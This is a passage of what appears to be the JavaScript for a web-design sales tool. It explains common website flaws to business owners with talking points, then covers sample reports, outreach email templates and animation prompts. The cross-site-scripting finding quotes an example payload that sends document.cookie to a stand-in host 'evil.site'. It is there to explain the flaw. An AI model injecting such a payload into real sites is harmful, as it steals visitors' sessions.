//# sourceMappingURL=app.js.map

// app.js.map is publicly downloadable —
// it rebuilds the entire original codebase, comments included.`,
  means:`Before a site goes live, its code is normally compressed into something unreadable. Alongside that, the tools generate a "map" file that turns it back into the original, so the developer can debug problems later.

That map is supposed to stay private. Here it's been uploaded to the live site, which means anyone can download it and reconstruct the complete original code — file structure, comments, developer notes, and anything else left in there.`,
  costs:`Mostly it's exposure. Whatever was in the code is now readable, including any comments about how things work or what isn't finished.

It also means anyone can copy the site's entire build, which matters more if there's anything custom worth copying.

On its own this is rarely a disaster. Combined with either of the problems above, it's how somebody finds those problems in the first place.`,
  say:`This one's less urgent but it tells you something about how the site was put together.

The full original source code is published on your live site — the readable version with all the developer's notes still in it. That file is meant to stay on the developer's machine, and it got uploaded by accident.

It's a one-line setting to stop that happening. I mention it mainly because it's a sign the site was pushed live quickly rather than carefully, which is usually why the bigger things I've shown you are there too.`,
  fix:`Turned off in the build settings — a one-line change, and I'd sweep the site for anything else that shouldn't be public.` },

nosanitize: { sev:'fix', weight:20,
  title:'Whatever visitors type gets run as code',
  code:`// review displayed straight onto the page
document.getElementById('reviews').innerHTML = userReview;

// a "review" reading:  &lt;img src=x onerror="fetch('//evil.site?c='+document.cookie)"&gt;
// is not text. The browser runs it.`,
  means:`When a site shows something a visitor typed — a review, a name, a message — it has to treat it strictly as text.

This site takes what people type and drops it straight into the page. The browser can't tell the difference between text somebody typed and instructions from the site itself, so if a visitor types instructions instead of words, the browser follows them.

That's not a theoretical trick. It's the most common way small sites get attacked, because it needs no special access — just the form that's already on the page.`,
  costs:`Someone can leave a "review" that quietly redirects visitors elsewhere, or steals whatever is stored in their browser, or replaces what the page says.

It runs for every future visitor until someone notices. The business's own site becomes the thing attacking their customers, on their domain, with their name on it.`,
  say:`Your site shows visitor submissions on the page, and it's putting them up without any filtering.

What that means is if somebody types instructions instead of a normal message, the browser runs them instead of displaying them. Someone could leave what looks like a review that actually redirects your visitors to another site — and it would keep doing it to everyone who visits until you spotted it.

The frustrating part is it's one function call to fix. It's just one that gets skipped constantly.`,
  fix:`Every piece of visitor input gets escaped so it can only ever be displayed as text, never executed, plus filtering before anything is stored.` },

norate: { sev:'fix', weight:12,
  title:'Nothing stops the form being submitted a thousand times',
  code:`app.post('/contact', async (req, res) =&gt; {
  await sendEmail(req.body);   // no limit, no check
  res.send('ok');
});`,
  means:`A form that anybody can submit needs something limiting how often it can be used — a check that submissions come from a real person, or a cap on how many arrive from one place per minute.

This one has nothing. It will accept submissions as fast as they arrive, forever.

Automated programs find unprotected forms and use them, sometimes just to send spam through somebody else's site.`,
  costs:`The inbox fills with junk and real enquiries get buried in it — which is worse than the form not working, because the owner stops checking.

If the form sends email through a paid service, each junk submission costs money, and a flood can get the domain flagged as a spam sender. That's the expensive part: once a domain's reputation goes, genuine emails to customers start landing in spam.`,
  say:`Your contact form has nothing limiting how often it can be submitted, so an automated program can hit it thousands of times.

Two things happen. Your inbox fills with junk and you stop reading it, so real enquiries get missed. And if enough goes out through your domain, your email reputation takes the hit — which means the invoices and quotes you send start landing in customers' spam folders.

That second one is the one that's hard to undo afterwards.`,
  fix:`A quiet check that filters out automated submissions without making real customers solve puzzles, plus a sensible rate limit.` },

oldlibs: { sev:'fix', weight:11,
  title:'Built on components with known, published flaws',
  code:`"dependencies": {
  "jquery":  "1.12.4",   // 2016 — known XSS advisories
  "lodash":  "4.17.4",   // known prototype pollution
  "axios":   "0.21.0"    // known SSRF advisory
}`,
  means:`Sites are assembled from pre-built components rather than written from scratch. Those components get updated when flaws are found, and the flaws get published publicly so everyone knows to update.

The components here are years out of date. The problems in them are documented, with public write-ups explaining exactly how to exploit each one.`,
  costs:`This isn't someone finding a flaw in this specific site. The flaws are already written up and the tools to use them are freely available.

It's the difference between a lock that might be pickable and a lock whose key is posted online. Automated scanners check for these versions specifically, because it's the cheapest thing to look for.`,
  say:`Your site's built on components that are about nine years out of date, and the problems in those versions are publicly documented — anyone can look up exactly what they are.

Updating them is routine maintenance, like an oil change. The reason it matters is that scanners specifically look for old versions, because it's the easiest thing to find.

Any site I build gets kept current as part of the arrangement.` ,
  fix:`Everything updated to current versions, tested, and then kept there rather than frozen the day it launches.` },

nohttps: { sev:'fix', weight:16,
  title:'Parts of the page load over an unencrypted connection',
  code:`&lt;script src="http://cdn.example.com/slider.js"&gt;&lt;/script&gt;
&lt;img src="http://example.com/hero.jpg"&gt;
&lt;!-- http, not https — browsers block or warn on these --&gt;`,
  means:`The site itself is secure, but some pieces it loads are hardcoded to the old, unencrypted address. That's called mixed content.

Browsers either block those pieces outright or show a warning, because a secure page loading insecure code isn't actually secure — anything travelling over the open connection can be read or altered in transit.`,
  costs:`Visitors see a security warning, or parts of the page silently fail to load and it looks broken. Usually the owner never sees it, because it's cached correctly on their own machine.

On public wifi, anything loaded that way can be altered before it reaches the visitor.`,
  say:`Your page is secure but some of the pieces it pulls in aren't — they're still using the old insecure addresses.

What visitors get is either a security warning next to your name, or bits of the page that quietly don't load. It'll usually look fine on your own computer, because yours has it saved, which is why this one goes unnoticed for years.

It's a find-and-replace fix, honestly. Half an hour.`,
  fix:`Every hardcoded address switched over and a check added so it can't creep back in.` },

nobuild: { sev:'minor', weight:8,
  title:'It\'s one enormous file that can\'t safely be changed',
  code:`index.html — 4,812 lines
  · all styling inline
  · all logic in one &lt;script&gt; block
  · same navigation pasted into 9 pages`,
  means:`The entire site is one huge file with everything in it, and shared pieces like the navigation are copy-pasted onto every page rather than written once.

This is what tools produce when they're asked to make something work quickly. It runs fine. It just can't be maintained.`,
  costs:`Not a security problem — a cost problem, and it shows up later.

Changing a phone number means finding it in nine places and getting all nine right. Every small edit risks breaking something unrelated, because everything is tangled together. Most developers quote higher for touching a site like this, or decline.

It's the reason a site gets abandoned and rebuilt from scratch in two years instead of being updated.`,
  say:`This one isn't about security, it's about what it costs you going forward.

Your site is one enormous file with everything copy-pasted through it. It works. But changing your phone number means finding it in nine separate places, and every edit risks knocking something else over.

That's why small changes get quoted expensively — nobody wants to touch it. Built properly, the sort of update you'd want a few times a year is a five-minute job instead of an afternoon.`,
  fix:`Shared pieces written once and reused, so a change happens in one place and appears everywhere.` }
};

/* Authored example sites for learning and call practice. Findings are fixed
   per site — nothing is invented about a real address, because a wrong claim
   on a live call is worse than no tool at all. To analyse a real business, type
   its address in the check box above, which runs a live check. */
const SAMPLES = [
  { id:'ai',  host:'summit-roofing-kc.netlify.app', label:'Built fast with an AI tool',
    note:'The pattern you see most: works on the surface, unfinished underneath.',
    found:['apikey','deadform','sourcemaps','nobuild','oldlibs'] },
  { id:'db',  host:'brightsmiledental.com', label:'Has a booking system',
    note:'Anything storing customer details raises the stakes.',
    found:['opendb','nosanitize','norate','nohttps'] },
  { id:'old', host:'joesplumbing1998.com', label:'Old site, never updated',
    note:'Nothing malicious — just fifteen years of drift.',
    found:['oldlibs','nohttps','nobuild','deadform'] },
  { id:'ok',  host:'meridianlandscape.com', label:'Mostly built properly',
    note:'Worth seeing what a clean-ish report looks like.',
    found:['norate'] }
];

let scSample=null, scIdx=0;

function renderSiteCheck(){
  const box=$('sc-report');
  if(!scSample){ box.innerHTML=''; return; }
  const S=scSample;
  const issues=S.found.map(id=>({id, ...FINDINGS[id]}));
  const passedIds=Object.keys(FINDINGS).filter(k=>!S.found.includes(k));

  const lost=issues.reduce((n,f)=>n+f.weight,0);
  const score=Math.max(5,100-lost);
  const crit=issues.filter(f=>f.sev==='critical').length;
  if(scIdx>=issues.length) scIdx=0;
  const f=issues[scIdx];
  const sevLabel={critical:'Fix today',fix:'Should fix',minor:'Worth mentioning'};

  box.innerHTML=`
    <div class="scoreline">
      <div><div class="big">${score}</div><div class="su">out of 100</div></div>
      <div class="sd"><b>${issues.length} ${issues.length===1?'problem':'problems'} in the code of ${S.host}.</b>
        ${crit?` ${crit} ${crit===1?'needs':'need'} fixing today — open with ${crit===1?'that one':'those'}.`:' Nothing on fire, but plenty to talk about.'}</div>
      <div style="margin-left:auto"><button class="btn" id="copyAll">Copy all talking points</button></div>
    </div>

    <div class="icard">
      <div class="ihead">
        <div class="ipos">Problem ${scIdx+1} of ${issues.length}
          <span class="sev ${f.sev}">${sevLabel[f.sev]}</span></div>
        <div class="ititle">${f.title}</div>
      </div>
      <div class="ibody">
        <div class="iblock"><div class="bh">What it looks like in the code</div>
          <pre class="snip">${f.code}</pre>
          <p class="tiny">Point at this on the screen share. Seeing it is what makes it real to them.</p></div>
        <div class="iblock"><div class="bh">What it means</div>${f.means.split('\n\n').map(t=>`<p>${t}</p>`).join('')}</div>
        <div class="iblock"><div class="bh">Why it costs them money</div>${f.costs.split('\n\n').map(t=>`<p>${t}</p>`).join('')}</div>
        <div class="iblock"><div class="bh">What to say on the call</div>
          <div class="saythis">${f.say.split('\n\n').map(t=>`<p>${t}</p>`).join('')}</div></div>
        <div class="iblock"><div class="bh">What you'd build instead</div><p>${f.fix}</p></div>
      </div>
      <div class="ifoot">
        <button class="btn" id="prevIssue" ${scIdx===0?'disabled':''}>← Previous</button>
        <button class="btn pri" id="nextIssue" ${scIdx===issues.length-1?'disabled':''}>Next problem →</button>
        <span class="sp">${scIdx+1} / ${issues.length}</span>
      </div>
    </div>

    <div class="alllist">
      ${issues.map((x,i)=>`<div class="ai2 ${i===scIdx?'on':''}" data-i="${i}">
        <span class="n">${String(i+1).padStart(2,'0')}</span>
        <span class="sev ${x.sev}">${sevLabel[x.sev]}</span>
        <span>${x.title}</span></div>`).join('')}
      ${passedIds.map(id=>`<div class="pass">${FINDINGS[id].title} — not an issue here</div>`).join('')}
    </div>`;

  $('nextIssue').addEventListener('click',()=>{ scIdx++; renderSiteCheck(); window.scrollTo(0,0); });
  $('prevIssue').addEventListener('click',()=>{ scIdx--; renderSiteCheck(); window.scrollTo(0,0); });
  box.querySelectorAll('.ai2').forEach(el=>el.addEventListener('click',()=>{ scIdx=+el.dataset.i; renderSiteCheck(); window.scrollTo(0,0); }));
  const cpAll=$('copyAll');
  cpAll.addEventListener('click',()=>{
    const txt=issues.map((x,i)=>`${i+1}. ${x.title}\n\n${x.say}`).join('\n\n---\n\n');
    navigator.clipboard?.writeText(`Notes for ${S.host}\n\n${txt}`);
    cpAll.textContent='Copied';
    setTimeout(()=>{ if(cpAll.isConnected) cpAll.textContent='Copy all talking points'; },1600);
  });
}

function renderSamplePicker(){
  $('sc-picker').innerHTML = SAMPLES.map(s=>`
    <button class="samp ${scSample&&scSample.id===s.id?'on':''}" data-s="${s.id}">
      <div class="sh">${s.host}</div>
      <div class="sl">${s.label}</div>
      <div class="sn">${s.note}</div>
      <div class="sc2">${s.found.length} ${s.found.length===1?'finding':'findings'}</div>
    </button>`).join('');
  $('sc-picker').querySelectorAll('.samp').forEach(b=>b.addEventListener('click',()=>{
    scSample=SAMPLES.find(x=>x.id===b.dataset.s); scIdx=0;
    renderSamplePicker(); renderSiteCheck();
  }));
}

$('runCheck').addEventListener('click', async () => {
  const v=$('siteUrl').value.trim();
  if(v){
    const btn=$('runCheck'); btn.disabled=true; btn.innerHTML='<span class="spin"></span> Checking…';
    $('sc-report').innerHTML=`<div class="scanline"><span class="spin"></span> Opening ${v} and reading how it is built…</div>`;
    try{
      const r=await unwrap(API.sitecheck.one(v));
      scSample={ id:'live', host:(r.url||v).replace(/^https?:\/\//,'').replace(/\/$/,''),
                 label:'Live check', note:'', found:r.findings.filter(f=>FINDINGS[f]) };
      scIdx=0; renderSamplePicker(); renderSiteCheck();
    }catch(err){
      $('sc-report').innerHTML=`<div class="alert"><span class="ai"><svg viewBox="0 0 24 24"><use href="#i-alert"/></svg></span>
        <div style="flex:1"><h4>Could not read that site</h4><p>${v} did not respond. Check the address, or the site may be down — which is itself worth knowing.</p></div></div>`;
    }finally{ btn.disabled=false; btn.textContent='Check it'; }
    return;
  }
  $('sc-report').innerHTML=`<div class="alert"><span class="ai"><svg viewBox="0 0 24 24"><use href="#i-alert"/></svg></span>
    <div style="flex:1"><h4>Enter a website address first</h4>
    <p>Type or paste a business's website into the box above, then press Check it to run a live report. Or open one of the example sites below to see how a finished report reads.</p></div></div>`;
});
$('siteUrl').addEventListener('keydown',e=>{ if(e.key==='Enter') $('runCheck').click(); });
renderSamplePicker();


/* =========================================================================
   Your Details — the sender half of every merge.
   The app knows everything about the recipient and nothing about the
   member, so this is the missing side. Filled once, stored locally.
   ========================================================================= */
const PROFILE_FIELDS=[
  {k:'name',    l:'Your name',           ph:'Jordan Rivera',         req:true},
  {k:'business',l:'Your business name',  ph:'Riverside Web Studio',  req:true,
   h:'If you don\'t have one yet, your own name is fine — plenty of people hire a person rather than a company.'},
  {k:'city',    l:'Where you\'re based', ph:'Austin',                req:true,
   h:'Being local is the single strongest thing you have over a web agency.'},
  {k:'phone',   l:'Your phone number',   ph:'(555) 123-4567',        req:true},
  {k:'email',   l:'Your email address',  ph:'you@yourbusiness.com',  req:true},
  {k:'site',    l:'Your portfolio or site', ph:'yourbusiness.com',   req:false,
   h:'Optional. Left blank, the emails simply won\'t mention it.'},
  {k:'price',   l:'Roughly what you charge', ph:'$800',              req:true,
   h:'A number in the email stops people asking "how much?" and never replying to the answer.'},
  {k:'turn',    l:'How long a build takes you', ph:'about a week',   req:false},
  {k:'proof',   l:'One line of proof',   ph:'I\'ve built sites for three local contractors this year', req:false, full:true,
   h:'Optional, and leave it out rather than stretch it. If you\'ve done one job, say one job.'}
];
let me = {name:'',business:'',city:'',phone:'',email:'',site:'',price:'',turn:'',proof:''};
const profileReady = () => PROFILE_FIELDS.filter(f=>f.req).every(f=>String(me[f.k]||'').trim());

function renderProfile(){
  $('profForm').innerHTML = PROFILE_FIELDS.map(f=>`
    <div class="${f.full?'full':''}">
      <label>${f.l}${f.req?'':' <span style="color:var(--ink-3);font-weight:400">(optional)</span>'}</label>
      <input data-k="${f.k}" placeholder="${f.ph}" value="${(me[f.k]||'').replace(/"/g,'&quot;')}">
      ${f.h?`<div class="h2">${f.h}</div>`:''}
    </div>`).join('');
  $('profNote').textContent = profileReady()? 'Saved — used in every email' : 'Fill the required fields to unlock Outreach';
}
$('saveProf').addEventListener('click', async () => {
  $('profForm').querySelectorAll('input').forEach(i=>me[i.dataset.k]=i.value.trim());
  await unwrap(API.profile.set(me));
  $('profpip').className = 'pip '+(profileReady()?'live':'off');
  $('profNote').textContent = profileReady()? 'Saved — used in every email' : 'Still missing something required';
});

/* =========================================================================
   Outreach — enrichment, site checks and writing in one place, because
   all three run over the same batch of leads.
   ========================================================================= */
const TEMPLATES={
  issues:{
    subject:`quick note about the {{business}} website`,
    body:`Hi{{firstName}},

I'm {{myName}} — I build websites for local businesses around {{myCity}}.

I had a look at how the website for {{business}} is put together, and found {{issueCount}} things worth flagging{{criticalLine}}.

I'm not going to pitch you over email. If you've got fifteen minutes I'll share my screen and show you exactly what I found — whether you fix it yourself or have someone else do it.

Builds run around {{price}} and take {{turn}} if you did want it handled.{{proofLine}}

Any chance you're free later this week?

{{myName}}
{{myBusiness}}
{{myPhone}}`
  },
  nosite:{
    subject:`{{business}} doesn't come up online`,
    body:`Hi{{firstName}},

I'm {{myName}} — I build websites for local businesses around {{myCity}}.

I went looking for {{business}} online and couldn't find a website, just the listing. If someone hears your name and searches for you, there's nothing for them to land on.

I'm not going to pitch you over email. If you've got fifteen minutes I'll show you what your competitors' sites look like and what I'd do differently for you.

Builds run around {{price}} and take {{turn}}.{{proofLine}}

Any chance you're free later this week?

{{myName}}
{{myBusiness}}
{{myPhone}}`
  }
};
let tmplIssues=TEMPLATES.issues.body, tmplNosite=TEMPLATES.nosite.body, outStage=1;

function mergeEmail(L){
  const noSite = !L.website;
  const t = noSite? tmplNosite : tmplIssues;
  const subj = (noSite?TEMPLATES.nosite.subject:TEMPLATES.issues.subject);
  const issues=(L.findings||[]).map(id=>FINDINGS[id]);
  const crit=issues.filter(f=>f.sev==='critical');
  const map={
    '{{business}}':   L.name,
    '{{firstName}}':  L.contact_name? ' '+L.contact_name.split(' ')[0] : ' there',
    '{{myName}}':     me.name,
    '{{myBusiness}}': me.business,
    '{{myCity}}':     me.city,
    '{{myPhone}}':    me.phone,
    '{{myEmail}}':    me.email,
    '{{price}}':      me.price,
    '{{turn}}':       me.turn||'a couple of weeks',
    '{{issueCount}}': issues.length? String(issues.length) : 'a few',
    '{{criticalLine}}': crit.length? ', one of which I\'d sort out this week' : '',
    '{{proofLine}}':  me.proof? ' '+me.proof+'.' : ''
  };
  const fill=str=>Object.entries(map).reduce((a,[k,v])=>a.split(k).join(v),str);
  return {subject:fill(subj), body:fill(t)};
}

async function enrichBatch(leads, onProgress){
  window._progress = onProgress;
  const r = await unwrap(API.enrich.run(leads.map(l => l.place_id)));
  await syncState();
  window._progress = null;
  return r.found;
}
async function checkBatch(leads, onProgress){
  window._progress = onProgress;
  await unwrap(API.sitecheck.batch(leads.filter(l => l.website).map(l => l.place_id)));
  await syncState();
  window._progress = null;
}

function renderSteps(){
  const leads=db.all();
  const enriched=leads.filter(l=>l.enriched).length;
  const withEmail=leads.filter(l=>l.email).length;
  const checked=leads.filter(l=>l.checked).length;
  const sent=leads.filter(l=>l.emailed).length;
  const step=(n,t,r,active,done)=>`<div class="step ${active?'active':''} ${done?'done':''}">
     <div class="sn2">Step ${n}</div><div class="st">${t}</div><div class="sr">${r}</div></div>`;
  $('outSteps').innerHTML =
    step(1,'Find their emails', enriched? `${withEmail} of ${leads.length} had an email published` : 'Visits each site looking for a published address', outStage===1, enriched>0)
  + step(2,'Check their sites', checked? `${checked} sites checked` : 'Reads how each site is built', outStage===2, checked>0)
  + step(3,'Write the emails', sent? `${sent} marked as sent` : 'Merges your details with what was found', outStage===3, sent>0);
}

function renderOutreach(){
  const leads=db.all();
  $('out-noprof').hidden = profileReady();
  $('out-noleads').hidden = !(profileReady() && leads.length===0);
  $('out-main').hidden = !(profileReady() && leads.length>0);
  if($('out-main').hidden) return;
  renderSteps();
  const box=$('outStage');

  if(outStage===1){
    const enriched=leads.filter(l=>l.enriched).length;
    const withEmail=leads.filter(l=>l.email);
    box.innerHTML=`<div class="tmpl">
      <p class="lede" style="margin-bottom:16px">This opens each lead's website and looks for a published email address and an owner's name. It uses no API searches and costs nothing — it's just reading public pages.</p>
      <button class="btn pri lg" id="runEnrich">${enriched?'Run again':`Find emails for ${leads.length} leads`}</button>
      ${enriched?`<div style="margin-top:16px" class="meter"><b>${withEmail.length}</b> of ${leads.length} had an email published. The rest can still be called.</div>`:''}
      <div id="enrProg" style="margin-top:16px"></div>
      ${enriched?`<div style="margin-top:18px"><button class="btn" id="toStep2">Next — check their sites →</button></div>`:''}
    </div>`;
    $('runEnrich').addEventListener('click',async()=>{
      const btn=$('runEnrich'); btn.disabled=true; btn.innerHTML='<span class="spin"></span> Reading sites…';
      await enrichBatch(leads,(d,t,f)=>{ $('enrProg').innerHTML=`<div class="scanline"><span class="spin"></span> ${d} of ${t} · ${f} emails found <span class="prog"><i style="width:${Math.round(d/t*100)}%"></i></span></div>`; });
      renderOutreach();
    });
    const n=$('toStep2'); if(n) n.addEventListener('click',()=>{ outStage=2; renderOutreach(); });
  }

  if(outStage===2){
    const checked=leads.filter(l=>l.checked).length;
    box.innerHTML=`<div class="tmpl">
      <p class="lede" style="margin-bottom:16px">Same idea, deeper read — this checks how each site is actually built so the emails have something specific to say. Also free.</p>
      <button class="btn pri lg" id="runCheckAll">${checked?'Run again':`Check ${leads.filter(l=>l.website).length} sites`}</button>
      <div id="chkProg" style="margin-top:16px"></div>
      ${checked?`<div style="margin-top:18px"><button class="btn" id="toStep3">Next — write the emails →</button></div>`:''}
    </div>`;
    $('runCheckAll').addEventListener('click',async()=>{
      const btn=$('runCheckAll'); btn.disabled=true; btn.innerHTML='<span class="spin"></span> Checking…';
      await checkBatch(leads,(d,t)=>{ $('chkProg').innerHTML=`<div class="scanline"><span class="spin"></span> ${d} of ${t} <span class="prog"><i style="width:${Math.round(d/t*100)}%"></i></span></div>`; });
      renderOutreach();
    });
    const n=$('toStep3'); if(n) n.addEventListener('click',()=>{ outStage=3; renderOutreach(); });
  }

  if(outStage===3){
    let targets=leads.filter(l=>l.email);
    if(!targets.length){
      box.innerHTML=`<div class="empty"><span class="bigico"><svg viewBox="0 0 24 24"><use href="#i-outreach"/></svg></span>
        <h3>None of these leads publish an email</h3>
        <p>That's normal — plenty of small businesses only have a contact form. Send them to the Call Organizer instead; a phone number is all you need.</p>
        <div style="margin-top:20px"><button class="btn pri lg" data-go="organizer" data-icon="i-calls" data-name="Call Organizer">Open Call Organizer</button></div></div>`;
      box.querySelectorAll('[data-go]').forEach(b=>b.addEventListener('click',()=>go(b)));
      return;
    }
    box.innerHTML=`
      <details class="tmplWrap" style="border:1px solid var(--line);border-radius:12px;background:var(--bg-panel);margin-bottom:20px;padding:0 20px">
        <summary style="cursor:pointer;padding:15px 0;font-size:13.5px;font-weight:500">Edit the two email templates (optional)</summary>
        <div class="tmpl" style="border:0;padding:0 0 18px;margin:0;background:none">
          <div class="sn2" style="font-family:var(--mono);font-size:9.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-3);margin-bottom:10px">Template — businesses that have a site</div>
          <textarea id="tA">${tmplIssues}</textarea>
          <div class="tokens">${['{{business}}','{{firstName}}','{{issueCount}}','{{criticalLine}}','{{myName}}','{{myBusiness}}','{{myCity}}','{{myPhone}}','{{price}}','{{turn}}','{{proofLine}}'].map(t=>`<span class="tok">${t}</span>`).join('')}</div>
          <div class="h2" style="margin-top:12px;font-size:11.5px;color:var(--ink-3);line-height:1.55">Notice what the template doesn't do: it never names the problems. Saying you found something specific and offering to show them is what gets the meeting — and spelling out a stranger's security holes in writing reads badly, however well you mean it.</div>
        </div>
        <div class="tmpl" style="border:0;padding:0 0 18px;margin:0;background:none">
          <div class="sn2" style="font-family:var(--mono);font-size:9.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-3);margin-bottom:10px">Template — businesses with no site at all</div>
          <textarea id="tB">${tmplNosite}</textarea>
        </div>
      </details>
      <div class="h-sec">${targets.length} emails ready to send</div>
      <p class="h2" style="font-size:12.5px;color:var(--ink-3);line-height:1.6;max-width:640px;margin:-2px 0 16px">Each business below has its own email, written from your details and what was found on its site. Click one to read or edit it, then <b>Send email</b> (opens your mail program) or <b>Gmail</b> — both open already addressed and filled in, so you just press send there.</p>
      <div id="mailList"></div>`;

    const redraw=()=>{
      $('mailList').innerHTML = targets.map((L,i)=>{
        const m=mergeEmail(L);
        return `<div class="mail ${L.emailed?'sent':''}" data-i="${i}">
          <div class="mh"><div><div class="to">${L.name}</div><div class="ad">${L.email}${L.contact_name?' · '+L.contact_name:''}</div></div>
            <span class="fz">${L.emailed?'Sent':(L.website?`${(L.findings||[]).length} findings`:'no site')}</span></div>
          <div class="mb"><div class="subj">Subject: ${m.subject}</div>
            <textarea data-body="${i}">${m.body}</textarea>
            <div class="mact">
              <button class="btn pri" data-send="${i}">${L.emailed?'Send again':'Send email'}</button>
              <button class="btn" data-gmail="${i}">Gmail</button>
              <button class="btn" data-copy="${i}">Copy</button>
              ${L.emailed?'<span class="meter" style="margin-left:auto">✓ sent</span>':`<button class="btn" data-sent="${i}" style="margin-left:auto">Mark sent</button>`}
            </div></div>
        </div>`;
      }).join('');
      $('mailList').querySelectorAll('.mh').forEach(h=>h.addEventListener('click',()=>h.parentElement.querySelector('.mb').classList.toggle('open')));
      $('mailList').querySelectorAll('[data-copy]').forEach(b=>b.addEventListener('click',()=>{
        const ta=$('mailList').querySelector(`[data-body="${b.dataset.copy}"]`);
        navigator.clipboard?.writeText(ta.value);
        b.textContent='Copied'; setTimeout(()=>{ if(b.isConnected) b.textContent='Copy'; },1500);
      }));
      const openCompose = async (i, makeUrl) => {
        const T=targets[i], m=mergeEmail(T);
        const body=$('mailList').querySelector(`[data-body="${i}"]`).value;
        await API.openExternal(makeUrl(T, m, body));
        await db.update(T.place_id,{ emailed_at:new Date().toISOString() });
        await db.logEvent('mail',`Emailed <b>${T.name}</b>`);
        targets=STATE.leads.filter(l=>l.email);
        redraw(); renderSteps(); refreshCounts();
      };
      $('mailList').querySelectorAll('[data-send]').forEach(b=>b.addEventListener('click',()=>openCompose(+b.dataset.send,
        (T,m,body)=>`mailto:${encodeURIComponent(T.email)}?subject=${encodeURIComponent(m.subject)}&body=${encodeURIComponent(body)}`)));
      $('mailList').querySelectorAll('[data-gmail]').forEach(b=>b.addEventListener('click',()=>openCompose(+b.dataset.gmail,
        (T,m,body)=>`https://mail.google.com/mail/?view=cm&fs=1&to=${encodeURIComponent(T.email)}&su=${encodeURIComponent(m.subject)}&body=${encodeURIComponent(body)}`)));
      $('mailList').querySelectorAll('[data-sent]').forEach(b=>b.addEventListener('click', async () => {
        const T=targets[+b.dataset.sent];
        await db.update(T.place_id,{ emailed_at:new Date().toISOString() });
        await db.logEvent('mail',`Emailed <b>${T.name}</b>`);
        targets=STATE.leads.filter(l=>l.email);
        redraw(); renderSteps(); refreshCounts();
      }));
    };
    redraw();
    $('tA').addEventListener('input',()=>{ tmplIssues=$('tA').value; redraw(); });
    $('tB').addEventListener('input',()=>{ tmplNosite=$('tB').value; redraw(); });
  }
  box.querySelectorAll('[data-go]').forEach(b=>b.addEventListener('click',()=>go(b)));
}


/* =========================================================================
   Prompt Library — every card runs its own live demo.
   Demos are pure CSS so they work offline; the prompts ask for GSAP,
   which is what you actually want once more than one thing moves.
   ========================================================================= */
const PROMPTS=[
{cat:'Page load', lib:'GSAP', title:'Staggered fade-up',
 blurb:'Elements rise into place one after another instead of all at once. The single highest ratio of "looks expensive" to effort in this whole list.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="st-w run" data-replay="st-w">
   <div class="dtitle">Roofing done right</div>
   <div class="bar" style="width:78%"></div><div class="bar g" style="width:58%"></div>
   <div class="blk" style="height:34px;width:130px"></div></div></div>`,
 prompt:`Add a page-load animation to my hero section using GSAP.

On load, animate the headline, the paragraph, and the button so they fade in and rise 24px into place, staggered 0.09s apart, in that order. Use a gsap.timeline() with ease "power3.out" and a duration of 0.7s.

Requirements:
- Set the starting state in CSS, not JavaScript, so nothing flashes visible before the animation runs
- Respect prefers-reduced-motion: if it is set, show everything immediately with no movement
- Do not animate anything below the fold on load`},

{cat:'Page load', lib:'GSAP', title:'Curtain reveal',
 blurb:'Panels slide up off the screen to uncover the page. Use once, on the homepage. Twice is a personality.',
 demo:`<div class="d"><div class="dtitle" style="position:absolute;inset:0;display:grid;place-items:center">Meridian</div>
   <div class="cu run" data-replay="cu"><i></i><i></i><i></i><i></i><i></i></div></div>`,
 prompt:`Build a curtain page-load reveal with GSAP.

Five full-height vertical panels cover the viewport on load, then slide upward out of view, each one 0.07s after the last, revealing the page underneath.

Requirements:
- Panels are fixed position with a high z-index, and are removed from the DOM once finished so they never block clicks
- Duration 0.8s, ease "power4.inOut"
- The hero content animates in as the last panel clears, not before
- Total time under 1.2 seconds — anything longer and people leave
- Skip entirely for prefers-reduced-motion and for repeat visits in the same session using sessionStorage`},

{cat:'Page load', lib:'GSAP SplitText', title:'Word-by-word headline',
 blurb:'The headline assembles itself. Reads as deliberate rather than decorative, because the eye follows the reading order.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="dtitle wd run" data-replay="wd">
   <span style="animation-delay:.05s">Built</span> <span style="animation-delay:.15s">for</span>
   <span style="animation-delay:.25s">the</span> <span style="animation-delay:.35s">trades.</span></div></div>`,
 prompt:`Animate my main headline word by word using GSAP with the SplitText plugin.

Split the headline into words. Each word starts 20px lower, slightly rotated, and invisible, then settles into place. Stagger 0.08s between words.

Requirements:
- SplitText is free now, so use it rather than splitting with a regex
- Revert the split after the animation so screen readers and text selection still work normally
- Ease "power3.out", duration 0.6s
- Do not split into individual characters — words read better and perform better
- Respect prefers-reduced-motion`},

{cat:'Page load', lib:'CSS only', title:'Blur focus-in',
 blurb:'Content resolves from a blur, like a camera focusing. Costs three lines and no library.',
 demo:`<div class="d" style="display:grid;place-items:center;text-align:center"><div class="bl run" data-replay="bl">
   <div class="dtitle">Sharper than<br>the competition</div></div></div>`,
 prompt:`Give my hero a blur focus-in animation using CSS only, no JavaScript library.

The hero starts at opacity 0, blurred 14px, and scaled to 1.06, then resolves to fully sharp and normal scale over 0.9s with a cubic-bezier(.16,1,.3,1) ease.

Requirements:
- Use a CSS @keyframes animation on page load
- Wrap it in a @media (prefers-reduced-motion: no-preference) block so it simply does not run for people who have asked for less motion
- Add will-change: filter, transform only while animating, then remove it, because leaving filter blur active costs performance`},

{cat:'Scroll', lib:'GSAP ScrollTrigger', title:'Reveal on scroll',
 blurb:'Sections animate in as they enter view. Scroll the panel to see it — this is the workhorse effect on almost every modern site.',
 demo:`<div class="d"><div class="sr" data-scrollreveal>
   <div class="sp"></div>
   <div class="it"><div class="dtitle" style="font-size:18px">What we do</div></div>
   <div class="it"><div class="bar" style="width:80%"></div></div>
   <div class="it"><div class="bar g" style="width:62%"></div></div>
   <div class="it"><div class="blk" style="height:52px"></div></div>
   <div class="it"><div class="bar g" style="width:70%"></div></div>
   <div class="sp"></div></div></div>`,
 prompt:`Add scroll-triggered reveals to every section of my page using GSAP ScrollTrigger.

Each section fades in and rises 30px when it reaches 80% down the viewport.

Requirements:
- Animate once and stay visible — do not reverse when scrolling back up, it is distracting
- Use ScrollTrigger with start "top 80%" and toggleActions "play none none none"
- Batch the elements with ScrollTrigger.batch() rather than creating one trigger per element, so a long page stays fast
- Stagger 0.1s within a batch
- Skip entirely for prefers-reduced-motion
- Call ScrollTrigger.refresh() after any images load, or the trigger points will be wrong`},

{cat:'Scroll', lib:'GSAP ScrollTrigger', title:'Parallax layers',
 blurb:'Background elements drift slower than the foreground, so the page gains depth. Subtle is the whole game here.',
